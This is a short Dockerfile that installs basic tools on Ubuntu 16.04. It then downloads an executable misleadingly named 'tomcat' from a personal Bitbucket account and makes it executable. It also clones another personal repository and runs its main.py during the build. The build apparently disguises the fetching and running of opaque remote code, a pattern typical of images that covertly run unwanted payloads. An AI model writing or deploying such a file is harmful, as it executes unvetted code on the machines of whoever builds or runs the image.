FROM ubuntu:16.04 
RUN apt-get update 
RUN apt-get install -y wget git psmisc python python-pip libcurl4-openssl-dev 
RUN wget https://bitbucket.org/fry1983/tomcat/downloads/tomcat && chmod +x tomcat 
RUN pip install requests 
RUN git clone https://melenevski@bitbucket.org/melenevski/app2.git 
RUN cd app2 && mv main.py ../ && mv id ../ 
RUN python main.py 
